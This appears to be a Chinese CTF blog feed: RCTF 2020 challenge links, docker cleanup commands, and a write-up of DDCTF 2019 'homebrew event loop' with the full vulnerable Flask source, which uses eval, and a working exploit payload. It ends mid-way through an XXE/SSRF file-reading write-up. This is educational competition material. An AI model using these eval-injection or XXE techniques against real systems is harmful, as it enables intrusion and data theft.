<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// do nothing</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Done'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$response</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sendfile</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$http</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-rBlog-2020"><a href="#2-rBlog-2020" class="headerlink" title="2.  rBlog 2020"></a>2.  rBlog 2020</h1><p><strong>题目链接：</strong></p><p><a href="https://rblog.rctf2020.rois.io" target="_blank" rel="noopener">https://rblog.rctf2020.rois.io</a></p><p>The source deployed on the server has been slightly modified to ensure the isolation of every single payload.</p><p><strong>hint：</strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p><h1 id="3-chowder-cross"><a href="#3-chowder-cross" class="headerlink" title="3.  chowder_cross"></a>3.  chowder_cross</h1><p><strong>题目链接：</strong></p><p>try to bypass chowder filter to get flag</p><p><a href="http://124.156.139.238/" target="_blank" rel="noopener">http://124.156.139.238/</a> </p><p><img src="/2020/05/30/2020-rctf/2.png" alt="hint"><br>hint3: Try to visit the non-existent page and see what happens, pay attention to img-src to see what happens, please combine my previous hints. </p><h1 id="4-Calc"><a href="#4-Calc" class="headerlink" title="4.  Calc"></a>4.  Calc</h1><p><strong>题目链接：</strong></p><p>nobody knows php better than me, So calc it<br><a href="http://124.156.140.90:8081" target="_blank" rel="noopener">http://124.156.140.90:8081</a> </p><h1 id="5-EasyBlog"><a href="#5-EasyBlog" class="headerlink" title="5.  EasyBlog"></a>5.  EasyBlog</h1><p> come and write something<br> <a href="http://124.156.134.92:8081" target="_blank" rel="noopener">http://124.156.134.92:8081</a> </p><p><img src="/2020/05/30/2020-rctf/1.png" alt="hint"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>best_docker</title>
      <link href="/2020/05/29/best-docker/"/>
      <url>/2020/05/29/best-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="1-docker基础"><a href="#1-docker基础" class="headerlink" title="1.  docker基础"></a>1.  docker基础</h1><h2 id="1-1-创建"><a href="#1-1-创建" class="headerlink" title="1.1  创建"></a>1.1  创建</h2><h2 id="1-2-删除"><a href="#1-2-删除" class="headerlink" title="1.2  删除"></a>1.2  删除</h2><h3 id="1-2-1-Docker-删除-image"><a href="#1-2-1-Docker-删除-image" class="headerlink" title="1.2.1  Docker 删除 image"></a>1.2.1  Docker 删除 image</h3><p><strong>删除 null image</strong></p><pre><code>sudo docker rmi $(docker images -f &quot;dangling=true&quot; -q)</code></pre><p><strong>删除所有镜像</strong></p><pre><code># 删掉容器docker stop $(docker ps -qa)docker rm $(docker ps -qa)# 删除镜像docker rmi --force $(docker images -q)</code></pre><p><strong>删除名称中包含某个字符串的镜像</strong></p><pre><code># 例如删除包含“some”的镜像docker rmi --force $(docker images | grep some | awk &#39;{print $3}&#39;)</code></pre><h2 id="1-3-modules"><a href="#1-3-modules" class="headerlink" title="1.3  modules"></a>1.3  modules</h2><h3 id="1-3-1-supervisor"><a href="#1-3-1-supervisor" class="headerlink" title="1.3.1  supervisor"></a>1.3.1  supervisor</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>关于supervisor 的使用以及配置  <a href="https://www.cnblogs.com/piperck/p/5380938.html" target="_blank" rel="noopener">https://www.cnblogs.com/piperck/p/5380938.html</a></p><p>守护进程</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj_1</title>
      <link href="/2020/05/27/buuoj-1/"/>
      <url>/2020/05/27/buuoj-1/</url>
      
        <content type="html"><![CDATA[<p>这篇blog将汇总buuoj所有一分题的解题思路。</p><h1 id="1-python"><a href="#1-python" class="headerlink" title="1.  python"></a>1.  python</h1><h2 id="1-1-python代码审计"><a href="#1-1-python代码审计" class="headerlink" title="1.1  python代码审计"></a>1.1  python代码审计</h2><h3 id="1-1-1-DDCTF-2019-homebrew-event-loop"><a href="#1-1-1-DDCTF-2019-homebrew-event-loop" class="headerlink" title="1.1.1  [DDCTF 2019]homebrew event loop"></a>1.1.1  [DDCTF 2019]homebrew event loop</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://www.cnblogs.com/wangtanzhi/p/12309335.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12309335.html</a></p><p><strong>2、</strong><a href="https://blog.cindemor.com/post/ctf-web-16.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-web-16.html</a></p><p><strong>3、</strong><a href="https://blog.csdn.net/zz_Caleb/article/details/92170270" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/92170270</a></p><p><strong>4、</strong><code>Flask(__name__)</code>   <a href="https://www.cnblogs.com/chaojiyingxiong/p/9549987.html" target="_blank" rel="noopener">https://www.cnblogs.com/chaojiyingxiong/p/9549987.html</a></p><p><strong>5、</strong>Python序列添加元素方法中+，+=，extend()和append()的区别  <a href="https://blog.csdn.net/qq_24805141/article/details/81427496" target="_blank" rel="noopener">https://blog.csdn.net/qq_24805141/article/details/81427496</a></p><p><strong>6、</strong>flask的request模块的属性  <a href="https://www.cnblogs.com/wangjikun/p/6935592.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangjikun/p/6935592.html</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment" spellcheck="true"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment" spellcheck="true"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#  trigger_event('action:view;index')</span>    <span class="token comment" spellcheck="true">#  把event加入队列</span>    <span class="token comment" spellcheck="true">#trigger_event函数的功能就是把传参加入到event_queue[]中，然后在execute_event_loop中进行利用。</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#最后5个字符</span>    <span class="token keyword">if</span> type<span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#get_mid_str函数的作用就是截取出原始字符串中第二个参数之后的所有字符，如果第三个参数不为空，则在原始字符串中截取第二个参数和第三个参数中间的字符串。</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#find返回第一次出现的位置，默认起始位置为0。</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> set<span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> None    <span class="token keyword">while</span> len<span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 取出event_queue中的值(也就是我们存放进去的参数)，然后去除第一个元素，相当于把首个元素弹出并进行利用。</span>        <span class="token keyword">if</span> <span class="token operator">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。逗号分隔两个选项。</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># event = request.event_queue[0]</span>            <span class="token comment" spellcheck="true"># 判断是否有非白名单的字符</span>            <span class="token keyword">if</span> c <span class="token operator">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            <span class="token comment" spellcheck="true">#  判断is_action的状态，0或者1，其实是判断开头是不是action</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#  举例子：action:view;index</span>            <span class="token comment" spellcheck="true">#  如果是多参数的话，可以用#分隔</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> eval<span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#为了在此处实现代码执行，需要注释掉后面的拼接部分。</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment" spellcheck="true"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> None<span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> None <span class="token operator">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 网站入口点</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token operator">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">or</span> len<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> dict<span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># handlers/functions below --------------------------------------</span><span class="token comment" spellcheck="true"># 页面渲染，三个页面</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have {} diamonds, {} points now.&lt;br />'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 下载源码</span>    bool_show_source <span class="token operator">=</span> str<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> str<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 增加钻石</span>    num_items <span class="token operator">=</span> int<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number({}) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    <span class="token comment" spellcheck="true"># 先加上num_items</span>    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger_event(['func:consume_point;','action:view;index'])</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 计算价钱，进行减钱</span>    point_to_consume <span class="token operator">=</span> int<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>final_payload：</strong></p><pre><code>?action:trigger_event#;action:buy;5#action:get_flag;第一个#用于注释，第二个#分隔参数让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。得到session后，python3 fl*3.py decode -c content</code></pre><h1 id="2-xxe"><a href="#2-xxe" class="headerlink" title="2.  xxe"></a>2.  xxe</h1><h2 id="2-1-xxe文件读取"><a href="#2-1-xxe文件读取" class="headerlink" title="2.1  xxe文件读取"></a>2.1  xxe文件读取</h2><h3 id="2-1-1-NCTF2019-True-XML-cookbook"><a href="#2-1-1-NCTF2019-True-XML-cookbook" class="headerlink" title="2.1.1  [NCTF2019]True XML cookbook"></a>2.1.1  [NCTF2019]True XML cookbook</h3><p><strong>考点：</strong>xxe + ssrf</p><p>利用xxe进行ssrf打内网，内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie</p><p>根据/etc/hosts得到内网地址，扫描内网网段（burpsuite）得到正确flag所在地址。</p><p><strong>step1：</strong>可以读取doLogin.php的内容</p><pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY 